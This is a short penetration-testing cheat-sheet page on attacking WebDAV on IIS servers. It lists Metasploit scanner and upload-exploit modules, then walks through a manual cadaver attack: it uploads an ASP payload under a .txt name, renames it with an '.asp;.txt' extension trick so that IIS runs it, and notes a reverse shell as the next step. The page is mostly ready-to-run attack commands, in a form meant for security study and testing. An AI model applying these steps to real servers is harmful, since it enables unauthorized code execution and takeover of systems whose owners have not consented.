# 🟨 WebDAV

### <mark style="color:orange;">WebDAV Exploitation using Metasploit</mark> <a href="#webdav-exploitation-using-metasploit" id="webdav-exploitation-using-metasploit"></a>

```bash
# Checking WebDAV using metasploit
use auxiliary/scanner/http/webdav_scanner
set rhosts <IP>
run

# Content discovery using metasploit
use auxiliary/scanner/http/webdav_website_content
set rhosts <IP>
run

# Checking authentication using metasploit
use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
set rhosts <IP>
run

# Upload exploitation using metasploit
use exploit/windows/iis/iis_webdav_upload_asp
```

### <mark style="color:orange;">Manual WebDAV exploitation (cadaver)</mark> <a href="#manual-webdav-exploitation-cadaver" id="manual-webdav-exploitation-cadaver"></a>

```bash
cadaver http://IP/

# Goal is to upload file on IIS Server.
ls 

# Find a directory where we can upload.
cd <path>

# Test for upload
put /path/to/test.asp test.asp

# Upload payload
put /path/to/payload.asp longnamebrotesttest123456789.txt

# Copy and rename payload
copy longnamebrotesttest123456789.txt longnamebrotesttest123456789.asp;.txt

# Access (should execute the ASP content)
http://IP/_vti_pvt/longnamebrotesttest123456789.asp%3b.txt
        
# Then go for reverse shell
```
